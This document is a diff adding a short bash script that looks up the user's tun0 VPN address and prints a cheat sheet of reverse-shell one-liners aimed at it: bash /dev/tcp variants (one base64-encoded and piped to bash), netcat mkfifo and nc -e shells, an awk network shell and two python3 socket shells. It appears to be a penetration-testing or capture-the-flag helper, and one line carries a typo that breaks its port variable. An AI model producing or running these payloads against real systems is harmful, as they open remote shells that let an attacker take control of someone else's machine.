@@ -1,0 +1,22 @@
+#!/bin/bash
+ip=$(ip addr show tun0 | grep "inet" | head -n 1 | awk '/inet/ {print $2}' | cut -d'/' -f1)
+p=80
+
+echo -e "\e[31mBash\e[0m"
+b64=$(echo -n"bash -i >& /dev/tcp/${ip}/${p} 0>&1" | base64 -w 0)
+echo "echo ${b64} | base64 -d | bash"
+echo "0<&196;exec 196<>/dev/tcp/${ip}/{p}; sh <&196 >&196 2>&196"
+echo "exec 5<>/dev/tcp/${ip}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"
+echo "bash -i >& /dev/tcp/${ip}/${p} 0>&1"
+
+echo -e "\n\e[31mNetcat\e[0m"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f"
+echo "nc -e /bin/bash ${ip} ${p}"
+echo "nc -e /bin/sh ${ip} ${p}"
+
+echo -e "\n\e[31mAwk\e[0m"
+echo "awk 'BEGIN {{s = \"/inet/tcp/0/${ip}/${p}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null"
+
+echo -e "\n\e[31mPython\e[0m"
+echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${ip}\",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip}\",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
